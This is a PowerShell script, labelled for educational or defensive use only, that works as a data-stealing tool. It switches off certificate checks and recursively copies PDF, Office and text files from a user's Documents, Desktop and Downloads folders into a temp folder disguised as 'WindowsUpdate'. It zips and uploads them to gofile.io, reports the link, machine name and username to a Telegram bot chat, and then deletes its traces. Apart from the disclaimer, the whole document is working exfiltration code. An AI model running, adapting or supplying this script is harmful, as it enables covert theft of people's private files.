# Telegram Bot Exfiltration Script
# WARNING: FOR EDUCATIONAL/DEFENSIVE SECURITY PURPOSES ONLY

# Fix SSL/TLS issues
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

# Telegram Bot Configuration
$TELEGRAM_BOT_TOKEN = 'cccc'
$TELEGRAM_CHAT_ID = 'xxx'

# ============================================
# FILE COLLECTION SECTION
# ============================================

$targetExtensions = @("*.pdf", "*.docx", "*.xlsx", "*.txt", "*.pptx")

$searchPaths = @(
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Downloads"
)

Write-Host "[*] Creating staging directory..." -ForegroundColor Yellow
$randomNumber = Get-Random -Minimum 1000 -Maximum 9999
$stagingDir = "$env:TEMP\WindowsUpdate_$randomNumber"
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null

Write-Host "[*] Searching for files..." -ForegroundColor Yellow
$fileCount = 0

foreach ($path in $searchPaths) {
    if (Test-Path $path) {
        Write-Host "[*] Scanning: $path" -ForegroundColor Cyan
        
        foreach ($extension in $targetExtensions) {
            $foundFiles = Get-ChildItem -Path $path -Filter $extension -Recurse -ErrorAction SilentlyContinue
            
            foreach ($file in $foundFiles) {
                Copy-Item -Path $file.FullName -Destination $stagingDir -ErrorAction SilentlyContinue
                $fileCount++
                Write-Host "[+] Collected: $($file.Name)" -ForegroundColor Green
            }
        }
    }
}

Write-Host "[+] Total files collected: $fileCount" -ForegroundColor Green

# ============================================
# COMPRESSION & UPLOAD
# ============================================

if ($fileCount -gt 0) {
    Write-Host "[*] Compressing collected files..." -ForegroundColor Yellow
    
    $zipFile = "$env:TEMP\saved_files_$randomNumber.zip"
    Compress-Archive -Path "$stagingDir\*" -DestinationPath $zipFile -Force
    
    $zipSize = (Get-Item $zipFile).Length / 1MB
    $zipSizeRounded = [math]::Round($zipSize, 2)
    
    Write-Host "[+] Archive created: $zipFile" -ForegroundColor Green
    Write-Host "[+] Archive size: $zipSizeRounded MB" -ForegroundColor Green
    
    # Upload to Gofile
    Write-Host "[*] Uploading to file host..." -ForegroundColor Yellow
    
    try {
        $uploadUrl = "https://upload.gofile.io/uploadfile"
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0")
        
        $response = $webClient.UploadFile($uploadUrl, "POST", $zipFile)
        $responseText = [System.Text.Encoding]::UTF8.GetString($response)
        $jsonResponse = $responseText | ConvertFrom-Json
        
        if ($jsonResponse.status -eq 'ok') {
            $downloadLink = $jsonResponse.data.downloadPage
            Write-Host "[+] Upload successful!" -ForegroundColor Green
            
            # Send notification via Telegram
            Write-Host "[*] Sending Telegram notification..." -ForegroundColor Yellow
            
            $computerName = $env:COMPUTERNAME
            $userName = $env:USERNAME
            $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            
            # Format message
            $message = "🔔 *New Data Package*`n`n"
            $message += "🖥️ *Computer:* ``$computerName```n"
            $message += "👤 *User:* ``$userName```n"
            $message += "📊 *Files:* $fileCount files`n"
            $message += "💾 *Size:* $zipSizeRounded MB`n"
            $message += "⏰ *Time:* $timestamp`n`n"
            $message += "🔗 *Download:* $downloadLink"
            
            # URL encode the message
            $encodedMessage = [System.Uri]::EscapeDataString($message)
            
            # Send via Telegram API
            $telegramUrl = "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage?chat_id=$TELEGRAM_CHAT_ID&text=$encodedMessage&parse_mode=Markdown"
            
            $webClient2 = New-Object System.Net.WebClient
            $result = $webClient2.DownloadString($telegramUrl)
            
            Write-Host "[+] Telegram notification sent!" -ForegroundColor Green
            
        } else {
            Write-Host "[-] Upload failed" -ForegroundColor Red
        }
    }
    catch {
        Write-Host "[-] Error: $_" -ForegroundColor Red
    }
    
    # Cleanup
    Write-Host "[*] Cleaning up..." -ForegroundColor Yellow
    Remove-Item -Path $stagingDir -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Cleanup completed" -ForegroundColor Green
    
} else {
    Write-Host "[!] No files collected" -ForegroundColor Yellow
    Remove-Item -Path $stagingDir -Force -ErrorAction SilentlyContinue
}

Write-Host "[*] Operation completed" -ForegroundColor Cyan
